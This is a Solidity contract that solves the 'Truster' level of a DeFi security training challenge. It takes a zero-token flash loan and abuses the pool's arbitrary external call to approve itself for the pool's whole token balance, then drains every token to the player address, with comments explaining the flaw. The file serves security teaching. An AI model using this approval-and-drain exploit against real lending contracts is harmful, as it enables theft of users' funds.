// SPDX-License-Identifier: MIT
pragma solidity =0.8.24;

// The player may not have access to the TrusterLenderPool contract, so the
// player should use this interface.
import { ITrusterLenderPool } from "./Interfaces/ITrusterLenderPool.i.sol";

import { DamnValuableToken } from "../DamnValuableToken.sol";

contract FasterThanTheFlash {
    address private player;
    ITrusterLenderPool private pool;

    constructor(address _pool, address _player) payable {
        pool = ITrusterLenderPool(payable(_pool));
        player = _player;
    }

    // For the Foundry test to see if you've solved the challenge, your
    // contract is instantiated and then this function is run.
    function solveChallenge() public {
        // Note that the test to see if you've succeeded is to see if the *player*
        // has all of the tokens. So if you solve the challenge by transferring
        // tokens into this contract, you must then transfer them to the player
        // address, which is provided as a private storage variable in this
        // contract.

        /*//////////////////////////////////////////////////////////////
                                    SOLUTION
        //////////////////////////////////////////////////////////////*/

        // The flashLoan() function allows us to specify an arbitrary contract
        // address and function in in the line:
        //    target.functionCall(data);

        // The contract assumes this will be a contract we own and that it will
        // be used to pay back the flash loan, but there is no requirement that
        // that is the case.

        // Because the ERC20 specification says that a transfer of 0 tokens
        // must be treated normally**, we can take out a "loan" of 0 tokens, and
        // then call an arbitrary contract from TrusterLenderPool, so that
        // the msg.sender on that call will be TrusterLenderPool.
        // Even though the external call may not have any functionality to
        // repay our "loan", because we take a loan of zero, the check at
        // the end of TrusterLenderPool.flashLoan():
        //    if (token.balanceOf(address(this)) < balanceBefore) {
        //        revert RepayFailed();
        //    }
        // will still pass, because we didn't change the address balance.

        // Therefore, we can use the "target.functionCall(data);" line to
        // call DamnValuableToken.approve(our_address, all_the_money)
        // and then take the tokens out of the TrusterLenderPool *after*
        // the flashLoan() is completed.

        // ** https://github.com/ethereum/ERCs/blob/f0472de5264349dfdcb425d0d9504ec3996f21aa/ERCS/erc-20.md?plain=1#L100

        DamnValuableToken token = DamnValuableToken(address(pool.token()));
        uint256 amount = token.balanceOf(address(pool));

        pool.flashLoan(
            0, // amount
            address(this), // borrower
            address(token), // target address called
            abi.encodeWithSignature("approve(address,uint256)", address(this), amount) // target function (and parameters) called
        );

        // Since we are now authorized to withdraw, we simply withdraw directly to the player address.
        // transferFrom() is an ERC20 function, so it is available to call from the DVT token, which inherits from ERC20.
        token.transferFrom(address(pool), player, amount);

        // Youtube walkthroughs:
        // https://www.youtube.com/watch?v=QWoiAVGJER8
        // https://www.youtube.com/watch?v=CMRaTqjLUfc
    }

    // The "payable" functionality and receive/fallback are provided for your
    // convenience. You are not required to use them and may remove them if you
    // want.
    receive() external payable { }
    fallback() external payable { }
}
